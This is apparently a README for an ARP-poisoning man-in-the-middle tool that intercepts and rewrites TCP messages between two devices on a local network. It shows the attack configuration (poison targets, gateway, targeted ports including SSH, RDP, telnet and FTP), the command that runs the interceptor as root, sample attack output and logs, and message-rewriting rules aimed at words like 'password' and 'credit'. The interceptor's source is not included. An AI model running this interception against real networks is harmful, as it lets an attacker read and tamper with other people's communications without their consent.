# Bidirectional TCP Socket Interception Testing Guide

## 🎯 Advanced Setup for Bidirectional Communication Interception

This guide shows you how to test **bidirectional TCP socket interception** between two specific devices using the improved Device-based configuration system.

## 📋 What's New

### **Enhanced Features:**
- ✅ **Device Objects**: Clean `Device(name, ip, mac, type)` configuration
- ✅ **Bidirectional Interception**: Intercept communication between any two devices
- ✅ **Custom Modifications**: Replace "hello" → "Bye", "hi" → "Goodbye", etc.
- ✅ **Direction Tracking**: See exactly which device sent what message
- ✅ **Threading Support**: Matches your bidirectional socket example

### **Configuration Upgrade:**
```python
# Old way (victim/gateway)
VICTIM_IP = "192.168.0.105"
GATEWAY_IP = "192.168.0.1"

# New way (device objects)
laptop = Device("laptop", "192.168.0.105", "XX:XX:XX:XX:XX:XX", "laptop")
phone = Device("phone", "192.168.0.150", "YY:YY:YY:YY:YY:YY", "phone") 
POISON_TARGET_1 = laptop
POISON_TARGET_2 = phone
```

## 🚀 Step-by-Step Setup

### **Step 1: Configure Your Devices**

Create `user_config.py` with your actual device information:

```python
#!/usr/bin/env python3
from config import Device, DeviceRegistry, AttackConfig, NetworkConfig

# Network Configuration
NetworkConfig.INTERFACE = "wlp2s0"  # Your WiFi interface
NetworkConfig.NETWORK_RANGE = "192.168.0.0/24"

# Define your actual devices
DeviceRegistry.laptop = Device(
    name="ubuntu_server",
    ip="192.168.0.105",           # Server laptop IP
    mac="XX:XX:XX:XX:XX:XX",      # Server laptop MAC
    device_type="laptop",
    description="Ubuntu Server Laptop"
)

DeviceRegistry.phone = Device(
    name="windows_client", 
    ip="192.168.0.150",           # Client laptop IP  
    mac="YY:YY:YY:YY:YY:YY",      # Client laptop MAC
    device_type="laptop",
    description="Windows Client Laptop"
)

DeviceRegistry.gateway = Device(
    name="router",
    ip="192.168.0.1",             # Router IP
    mac="ZZ:ZZ:ZZ:ZZ:ZZ:ZZ",      # Router MAC
    device_type="router",
    description="WiFi Router"
)

# Set attack targets (which devices to intercept between)
AttackConfig.POISON_TARGET_1 = DeviceRegistry.laptop   # Server
AttackConfig.POISON_TARGET_2 = DeviceRegistry.phone    # Client  
AttackConfig.GATEWAY_DEVICE = DeviceRegistry.gateway

# Custom message modifications
AttackConfig.SOCKET_MODIFICATIONS = {
    'hello': 'Bye',
    'hi': 'Goodbye',
    'secret': 'INTERCEPTED',
    'password': 'HACKED'
}

print("✅ Bidirectional configuration loaded!")
```

### **Step 2: Discover Your Network**

```bash
# Find devices and their MAC addresses
python3 network_device_scanner.py --detailed

# Example output:
# 192.168.0.105 - aa:bb:cc:dd:ee:ff (Ubuntu Server)
# 192.168.0.150 - 11:22:33:44:55:66 (Windows Client) 
# 192.168.0.1   - 99:88:77:66:55:44 (Router)
```

### **Step 3: Start Your Socket Server**

On the **Ubuntu laptop**, use your bidirectional server:

```python
#!/usr/bin/env python3
import socket
import threading
import time

def receive_messages(client):
    while True:
        try:
            message = client.recv(1024).decode('utf-8')
            if not message:
                break
            print(f"\n📨 Client: {message}")
        except:
            break

def send_messages(client):
    while True:
        try:
            message = input("🧑 Server: ")
            if not message:
                continue
            timestamped = f"[{time.strftime('%H:%M:%S')}] Server: {message}"
            client.send(timestamped.encode('utf-8'))
        except:
            break

def run_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(1)
    
    print("🖥️  Bidirectional Server listening on port 9999...")
    client, addr = server.accept()
    print(f"📱 Connection from {addr}")

    # Start threads for bidirectional communication
    threading.Thread(target=receive_messages, args=(client,), daemon=True).start()
    threading.Thread(target=send_messages, args=(client,), daemon=True).start()

    # Keep main thread alive
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n🔌 Closing connection...")
            client.close()
            break

if __name__ == "__main__":
    run_server()
```

### **Step 4: Test Normal Communication**

On the **Windows laptop**, run the bidirectional client:

```bash
python3 bidirectional_client.py
```

Enter server IP and test normal communication:
```
Enter server IP: 192.168.0.105
Enter your name: Alice

💻 Bidirectional TCP Client Started
✅ Connected to server!

🧑 Alice: hello
📨 Server: [15:30:45] Server: hi there

🧑 Alice: how are you?
📨 Server: [15:30:50] Server: I'm fine!
```

**This should work normally without interception.**

### **Step 5: Start Bidirectional Interception**

On the **attacker laptop**, start the interceptor:

```bash
sudo python3 bidirectional_tcp_interceptor.py
```

You should see:
```
🎯 BIDIRECTIONAL TCP SOCKET INTERCEPTION CONFIGURATION
======================================================================
Interface:              wlp2s0
Target Device 1:        ubuntu_server (192.168.0.105) - laptop
Target Device 2:        windows_client (192.168.0.150) - laptop
Gateway Device:         router (192.168.0.1) - router
Socket Ports:           [9999, 8080, 12345, 22, 23, 21]
Bidirectional Mode:     Enabled
Message Modifications:  {'hello': 'Bye', 'hi': 'Goodbye', 'secret': 'INTERCEPTED', 'password': 'HACKED'}
======================================================================
📋 Communication Patterns:
  • ubuntu_server ↔ windows_client (Direct)
  • ubuntu_server → Gateway → windows_client (Routed)
  • windows_client → Gateway → ubuntu_server (Routed)
======================================================================
🤔 Proceed with bidirectional socket interception? (yes/no): yes

[ATTACK] 🚀 Starting bidirectional ARP poisoning & TCP socket interception
[ARP-POISON] 🎯 Starting continuous bidirectional ARP poisoning
[MITM] 🚀 Bidirectional TCP Socket interception system started
```

### **Step 6: Test Bidirectional Interception**

Now continue the conversation and watch the modifications:

**Client side:**
```
🧑 Alice: hello
📨 Server: [MITM:ubuntu_server→windows_client] [15:33:20] Server: Goodbye there

🧑 Alice: secret message  
📨 Server: [MITM:ubuntu_server→windows_client] [15:33:25] Server: Got your INTERCEPTED message!
```

**Server side:**
```
📨 Client: [MITM:windows_client→ubuntu_server] [15:33:15] Alice: Bye
🧑 Server: hi there

📨 Client: [MITM:windows_client→ubuntu_server] [15:33:20] Alice: INTERCEPTED message
🧑 Server: Got your secret message!
```

**Perfect! Both directions are being intercepted and modified!**

### **Step 7: Monitor Attack Logs**

```bash
tail -f tcp_socket_attack.log
```

You should see:
```
[SOCKET-TRAFFIC] 🎯 windows_client → ubuntu_server | 192.168.0.150:52341 -> 192.168.0.105:9999
[SOCKET-MESSAGE] 📨 windows_client → ubuntu_server | Intercepted: '[15:33:15] Alice: hello'
[SOCKET-MODIFY] 🔧 windows_client → ubuntu_server | Original: '[15:33:15] Alice: hello'
[SOCKET-MODIFY] 🔧 windows_client → ubuntu_server | Modified: '[MITM:windows_client→ubuntu_server] [15:33:15] Alice: Bye'
[SOCKET-MODIFY] ✅ windows_client → ubuntu_server | Message successfully modified!

[SOCKET-TRAFFIC] 🎯 ubuntu_server → windows_client | 192.168.0.105:9999 -> 192.168.0.150:52341
[SOCKET-MESSAGE] 📨 ubuntu_server → windows_client | Intercepted: '[15:33:20] Server: hi there'
[SOCKET-MODIFY] 🔧 ubuntu_server → windows_client | Original: '[15:33:20] Server: hi there'
[SOCKET-MODIFY] 🔧 ubuntu_server → windows_client | Modified: '[MITM:ubuntu_server→windows_client] [15:33:20] Server: Goodbye there'
[SOCKET-MODIFY] ✅ ubuntu_server → windows_client | Message successfully modified!
```

## 🎯 Key Features Demonstrated

### **1. Bidirectional Interception**
```
Alice types: "hello"  
→ Server receives: "[MITM:...] Alice: Bye"

Server types: "hi there"
→ Alice receives: "[MITM:...] Server: Goodbye there"
```

### **2. Direction Tracking**
- `windows_client → ubuntu_server`: Client to Server
- `ubuntu_server → windows_client`: Server to Client  
- Shows exactly who sent what

### **3. Custom Modifications**
```python
SOCKET_MODIFICATIONS = {
    'hello': 'Bye',        # hello → Bye
    'hi': 'Goodbye',       # hi → Goodbye  
    'secret': 'INTERCEPTED', # secret → INTERCEPTED
    'password': 'HACKED'   # password → HACKED
}
```

### **4. Device-Based Configuration**
- Clean device objects instead of victim/gateway confusion
- Easy to understand which devices are being targeted
- Scalable to multiple device pairs

## 🔧 Customizing Interceptions

### **Add More Modifications:**
```python
AttackConfig.SOCKET_MODIFICATIONS = {
    'hello': 'Bye',
    'hi': 'Goodbye', 
    'love': 'hate',
    'yes': 'no',
    'good': 'bad',
    'login': 'FAKE_LOGIN',
    'credit': 'STOLEN'
}
```

### **Target Different Ports:**
```python
AttackConfig.SOCKET_PORTS = [9999, 8080, 22, 3389, 5000]
```

### **Add More Device Pairs:**
```python
# You can define multiple device pairs and switch targets
DeviceRegistry.tablet = Device("tablet", "192.168.0.125", "...", "tablet")
AttackConfig.POISON_TARGET_2 = DeviceRegistry.tablet  # Switch target
```

## 🛑 Stopping the Attack

1. **Stop interceptor**: Press `Ctrl+C` on attacker laptop
2. **Automatic cleanup**: ARP tables restored, IP forwarding disabled
3. **Test normal**: Communication should work normally again

## 📊 Expected Results

### **Without Attack:**
```
Client: "hello world"
Server: "hi there" 
```

### **With Bidirectional Attack:**
```
Client sends: "hello world"
→ Server receives: "[MITM:client→server] Bye world"

Server sends: "hi there"  
→ Client receives: "[MITM:server→client] Goodbye there"
```

## 🚨 Troubleshooting

### **Configuration Issues:**
```bash
# Test configuration
python3 config.py

# Check device definitions
python3 -c "from config import DeviceRegistry; print([d for d in DeviceRegistry.list_devices()])"
```

### **No Interception:**
```bash
# Check if devices can communicate normally first
ping 192.168.0.105
ping 192.168.0.150

# Verify ARP tables during attack
watch -n 1 "arp -a"
```

### **Permission Issues:**
```bash
# Run as root
sudo python3 bidirectional_tcp_interceptor.py

# Check iptables rules
sudo iptables -L -n
```

This demonstrates that **any TCP socket communication between any two devices can be intercepted and modified bidirectionally** using the improved Device-based configuration system!

## 🎯 Comparison with Original Approach

### **Old Approach (Victim → Gateway):**
- Limited to victim-to-internet traffic
- Confusing victim/gateway terminology
- Only intercepts traffic going through router

### **New Approach (Device ↔ Device):**
- **Direct device-to-device interception**
- **Bidirectional modification**
- **Clear device naming**
- **Works with any two devices**
- **Better for peer-to-peer applications**

Your bidirectional socket communication is now fully interceptable! 